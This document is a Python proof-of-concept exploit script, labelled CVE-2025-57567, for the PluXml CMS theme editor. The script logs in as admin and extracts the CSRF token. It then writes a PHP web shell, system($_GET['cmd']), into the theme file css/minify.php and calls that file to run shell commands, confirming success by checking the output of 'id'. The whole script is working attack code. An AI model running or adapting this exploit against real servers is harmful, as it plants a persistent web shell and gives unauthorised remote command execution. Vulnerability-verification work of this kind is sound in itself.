import requests
import re
import sys
import time

BASE_URL = "http://localhost:8089"
USERNAME = "admin"
PASSWORD = "admin123"
EMAIL = "admin@test.com"


def login(session):
    login_url = f"{BASE_URL}/core/admin/auth.php"
    data = {
        "login": USERNAME,
        "password": PASSWORD,
        "redirect": "/core/admin/"
    }

    resp = session.post(login_url, data=data, allow_redirects=True)
    if "deconnexion" in resp.text.lower() or "logout" in resp.text.lower() or "index.php" in resp.url:
        print("[+] Login successful")
        return True
    else:
        print("[-] Login failed")
        return False


def exploit_rce(session, cmd="id"):
    edittpl_url = f"{BASE_URL}/core/admin/parametres_edittpl.php"
    target_template = "css/minify.php"

    resp = session.get(edittpl_url)
    if resp.status_code != 200:
        print("[-] Failed to access template editor")
        return None

    token_match = re.search(r'name="token"\s+value="([^"]+)"', resp.text)
    if not token_match:
        print("[-] Failed to extract CSRF token")
        return None
    token = token_match.group(1)

    payload = '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); exit; } ?>'

    data = {
        "token": token,
        "tpl": target_template,
        "template": target_template,
        "content": payload,
        "submit": "1"
    }

    resp = session.post(edittpl_url, data=data)
    if resp.status_code == 200:
        print(f"[+] Payload injected into {target_template}")
    else:
        print("[-] Failed to inject payload")
        return None

    time.sleep(1)

    trigger_url = f"{BASE_URL}/themes/defaut/{target_template}?cmd={cmd}"
    resp = session.get(trigger_url)

    if resp.status_code == 200 and resp.text.strip():
        result = resp.text.strip()
        print(f"[+] RCE successful!")
        print(f"[+] Command output:\n{result}")
        return result

    print("[-] RCE failed")
    return None


def main():
    print("=" * 60)
    print("CVE-2025-57567 - PluXml Theme Editor RCE PoC")
    print("=" * 60)

    session = requests.Session()
    if not login(session):
        print("[-] Exploit failed: cannot login")
        sys.exit(1)

    result = exploit_rce(session, cmd="id")

    if result and ("uid=" in result or "gid=" in result):
        print("\n[+] Vulnerability confirmed!")
        sys.exit(0)
    else:
        print("\n[-] Vulnerability verification failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
